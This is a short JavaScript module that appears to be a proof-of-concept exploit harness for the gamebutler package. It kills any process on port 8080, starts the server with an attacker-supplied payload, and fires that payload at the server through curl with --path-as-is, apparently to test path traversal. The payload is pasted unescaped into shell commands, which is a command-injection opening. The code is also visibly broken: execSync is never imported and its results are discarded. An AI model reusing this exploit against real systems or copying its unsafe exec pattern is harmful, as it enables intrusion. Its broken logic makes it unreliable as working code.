function exploitFunction(payload) {
    const { exec } = require("child_process");
    const fs = require("fs");
    const sleep = require("sleep");

    // Cleanup any existing server on port 8080
    try {
        execSync("fuser -k 8080/tcp");
    } catch (e) {}

    // Define the server command
    let server = `node ./node_modules/gamebutler/build/gamebutler.js ${payload}`;

    // Start the server
    let exe = exec(server, (error, stdout) => {
        sleep.sleep(2);

        // Execute the attack with the payload
        let attack_string = `curl -v --path-as-is "http://127.0.0.1:8080${payload}"`;
        exec(attack_string, (error, stdout) => {
            return stdout;
        });
    });

    return null; // Return nothing for now, we only care about the payload
}

module.exports = { exploitFunction };